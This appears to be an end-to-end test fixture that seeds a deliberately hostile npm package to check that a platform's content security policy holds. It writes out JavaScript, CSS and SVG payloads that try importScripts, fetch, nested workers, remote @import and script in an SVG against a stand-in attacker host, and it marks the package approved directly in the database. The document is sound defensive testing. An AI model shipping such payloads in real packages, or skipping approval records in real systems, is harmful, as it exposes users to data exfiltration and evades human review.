/**
 * A hostile npm package, approved for an App and built for the browser,
 * for the e2e stack. Resolving and building a package reaches the npm
 * registry through connect, which a local stack can't point at a fake
 * (connections-seed.ts says the same of Microsoft and Composio), so this
 * leaves behind what resolving, approving and building would have:
 *
 * - the App's request for the graph, through core's own `propose`, then
 *   marked approved in core's database as a person's decision leaves it.
 *   Deciding through the product would first need someone given the
 *   permission to approve, which moves the deployment's policy generation
 *   under every other test approving at the same time (dashboard.e2e.ts);
 * - the App's lock for that graph, pinning the artifact for the running
 *   compiler, in core's database;
 * - the artifact's description and files, in core's local R2 bucket.
 *
 * Then the builder asks core to build, as the product would: core finds
 * the pinned artifact kept, checks its admission, the lock and every file's
 * hash, and answers where its files are served. Seeded rather than built,
 * the artifact can hold what the build would refuse (a script in an SVG,
 * a stylesheet that fetches from elsewhere): the policy where it is
 * served must hold even for bytes the build let through by mistake.
 */
import { execFileSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { createRequire } from "node:module";
import { tmpdir } from "node:os";
import path from "node:path";
import { pathToFileURL } from "node:url";

import { sha256Hex } from "@grasp-os/shared/encoding";
import { canonicalJson } from "@grasp-os/shared/json";
import {
  lockGraph,
  packageArtifactSchema,
  targetConditions,
} from "@grasp-os/shared/packages";
import type { GraspLock, PackageArtifact } from "@grasp-os/shared/packages";
import { z } from "zod";

import { execute, quoted, whileBusy } from "./connections-seed.ts";
import { apiOf } from "./people.ts";
import type { Person } from "./people.ts";
import { stateDir } from "./stack.ts";

const root = path.join(import.meta.dirname, "..");
const coreDir = path.join(root, "apps/core");

/** The package's name, and the file of its one entry. */
export const hostileName = "hostile-widget";

/**
 * The entry's code. Started as a worker, it tries what no build can see:
 * a worker made from a computed name, `importScripts` and a fetch
 * elsewhere. It posts each policy violation the browser reports to it as
 * it comes, and what happened to each attempt once the last one settled.
 * In a page it does nothing: a screen can't load it (the screen test).
 */
const entryCode = (attacker: string): string => `"use strict";
(() => {
  if (typeof WorkerGlobalScope === "undefined" || new URL(location.href).searchParams.has("nested")) {
    return;
  }
  const attacker = ${JSON.stringify(attacker)};
  self.addEventListener("securitypolicyviolation", (event) => {
    postMessage({ violation: event.effectiveDirective + " " + event.blockedURI });
  });
  const outcomes = {};
  try {
    importScripts(attacker + "/imported.js");
    outcomes.importScripts = "ran";
  } catch (error) {
    outcomes.importScripts = "refused: " + error.name;
  }
  try {
    const Make = globalThis[["Wor", "ker"].join("")];
    const nested = new URL(location.href);
    nested.searchParams.set("nested", "1");
    new Make(nested);
    outcomes.worker = "started";
  } catch (error) {
    outcomes.worker = "refused: " + error.name;
  }
  fetch(attacker + "/fetched").then(
    () => "ran",
    (error) => "refused: " + error.name
  ).then((fetched) => {
    outcomes.fetch = fetched;
    postMessage({ outcomes });
  });
})();
`;

/**
 * The entry's stylesheet: what the build refuses (remote `@import`, a font
 * and images from elsewhere, one through a custom property), as if it had
 * let it through.
 */
const stylesheet = (
  attacker: string
): string => `@import url("${attacker}/css-import.css");
@font-face { font-family: Hostile; src: url("${attacker}/font.woff2"); }
:root { --remote: url("${attacker}/var.png"); }
svg { background-image: var(--remote), url("${attacker}/background.png"); }
.hostile { font-family: Hostile; }
`;

/** An SVG with script in it, styles inline and its stylesheet, and a remote image. */
const svg = (
  attacker: string
): string => `<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet href="../${hostileName}.css" type="text/css"?>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" onload="fetch('${attacker}/svg-onload')">
  <style>@import url("${attacker}/svg-import.css");</style>
  <script>fetch("${attacker}/svg-script"); document.documentElement.setAttribute("data-ran", "script");</script>
  <image href="${attacker}/svg-image.png" width="10" height="10"/>
  <rect width="100" height="100"/>
  <text class="hostile" x="10" y="150">Hostile</text>
</svg>
`;

/** The artifact's files, by path, with their types. */
const artifactFiles = (
  attacker: string
): Record<string, { text: string; type: string }> => ({
  [`${hostileName}.js`]: { text: entryCode(attacker), type: "text/javascript" },
  [`${hostileName}.css`]: { text: stylesheet(attacker), type: "text/css" },
  "assets/hostile.svg": { text: svg(attacker), type: "image/svg+xml" },
});

const encoder = new TextEncoder();

const sha256 = async (text: string): Promise<string> =>
  Buffer.from(
    await crypto.subtle.digest("SHA-256", encoder.encode(text))
  ).toString("hex");

/** The platform peers the running compiler resolves against: its React. */
const platformPeers = (): Record<string, string> => {
  const require = createRequire(
    path.join(root, "packages/compiler/package.json")
  );
  const version = (name: string): string =>
    z.object({ version: z.string() }).parse(require(`${name}/package.json`))
      .version;
  return { react: version("react"), "react-dom": version("react-dom") };
};

/** The running compiler's version, as core's build wrote it. */
const compilerVersion = async (): Promise<string> => {
  const module: unknown = await import(
    pathToFileURL(path.join(root, "packages/compiler/dist/version.js")).href
  );
  return z.object({ version: z.string() }).parse(module).version;
};

/** Puts `text` at `key` in core's local R2 bucket. */
const putFile = async (
  key: string,
  text: string,
  type: string
): Promise<void> => {
  const directory = mkdtempSync(path.join(tmpdir(), "grasp-e2e-artifact-"));
  try {
    const file = path.join(directory, "file");
    writeFileSync(file, text);
    await whileBusy(() => {
      execFileSync(
        path.join(root, "node_modules/.bin/wrangler"),
        [
          "r2",
          "object",
          "put",
          `grasp-os-files/${key}`,
          "--local",
          "--persist-to",
          stateDir,
          "--file",
          file,
          "--content-type",
          type,
        ],
        {
          cwd: coreDir,
          stdio: "pipe",
          env: { ...process.env, WRANGLER_SEND_METRICS: "false" },
        }
      );
    });
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
};

/** What core keeps of the seeded artifact, and where it serves it. */
export interface SeededArtifact {
  app: string;
  graphHash: string;
  approval: string;
  compiler: string;
  hash: string;
  /** Where its files are served: a path ending in `/`. */
  address: string;
}

/**
 * A new App of `builder`'s with the hostile package approved and built
 * for the browser, every attempt aimed at `attacker`.
 */
export const seedHostileArtifact = async (
  builder: Person,
  attacker: string
): Promise<SeededArtifact> => {
  const { core, api } = apiOf(builder);
  try {
    const { id: app } = await api.apps.create({ name: "Hostile widget" });
    const integrity = `sha512-${Buffer.from(
      await crypto.subtle.digest("SHA-512", encoder.encode(attacker))
    ).toString("base64")}`;
    const version = "1.0.0";
    const lock: GraspLock = {
      lockfileVersion: 1,
      registry: "https://registry.npmjs.org",
      requested: { [hostileName]: version },
      direct: { [hostileName]: version },
      platformPeers: platformPeers(),
      targets: {
        browser: {
          conditions: [...targetConditions.browser],
          entries: [hostileName],
        },
      },
      packages: {
        [`${hostileName}@${version}`]: {
          name: hostileName,
          version,
          integrity,
          license: "MIT",
          publishedAt: new Date(
            Date.now() - 30 * 24 * 60 * 60 * 1000
          ).toISOString(),
          dependencies: {},
          peers: {},
        },
      },
    };
    const request = await api.dependencies.propose({
      app,
      sourceRevision: "rev-1",
      purpose: "Show a widget.",
      targets: ["browser"],
      graph: lockGraph(lock, lock.platformPeers),
      findings: [],
      refused: [],
    });
    await execute(
      `UPDATE dependency_requests SET status = 'approved', decided_by = ${quoted(builder.userId)}, decided_at = ${Date.now()}, decided_generation = policy_generation WHERE id = ${quoted(request.id)}`,
      "core"
    );

    const files = artifactFiles(attacker);
    const fileEntries: PackageArtifact["files"] = {};
    for (const [file, { text, type }] of Object.entries(files)) {
      fileEntries[file] = {
        // oxlint-disable-next-line no-await-in-loop -- three small files
        sha256: await sha256(text),
        bytes: encoder.encode(text).byteLength,
        type,
      };
    }
    const described: PackageArtifact = packageArtifactSchema.parse({
      target: "browser",
      conditions: [...targetConditions.browser],
      entries: {
        [hostileName]: {
          module: `${hostileName}.js`,
          css: `${hostileName}.css`,
          resolved: `${hostileName}@${version}/index.js`,
        },
      },
      imports: [],
      files: fileEntries,
    });
    const hash = await sha256Hex(canonicalJson(described));
    const compiler = await compilerVersion();
    const pinned: GraspLock = {
      ...lock,
      artifacts: {
        [compiler]: {
          browser: {
            hash,
            exports: { [hostileName]: `${hostileName}@${version}/index.js` },
          },
        },
      },
    };
    await execute(
      `INSERT INTO dependency_locks (app_id, graph_hash, lock, created_at) VALUES (${quoted(app)}, ${quoted(request.graphHash)}, ${quoted(canonicalJson(pinned))}, ${Date.now()})`,
      "core"
    );
    for (const [file, { text, type }] of Object.entries(files)) {
      // oxlint-disable-next-line no-await-in-loop -- one write at a time
      await putFile(`package-builds/${hash}/${file}`, text, type);
    }
    await putFile(
      `package-builds/${hash}.json`,
      canonicalJson(described),
      "application/json"
    );

    const { policyGeneration } = await api.dependencies.status(app);
    const built = await api.dependencies.build({
      app,
      graphHash: request.graphHash,
      target: "browser",
      policyGeneration,
    });
    if (built.hash !== hash || built.address === null) {
      throw new Error("Core didn't keep the seeded artifact");
    }
    return {
      app,
      graphHash: request.graphHash,
      approval: built.approval,
      compiler,
      hash,
      address: built.address,
    };
  } finally {
    core[Symbol.dispose]();
  }
};
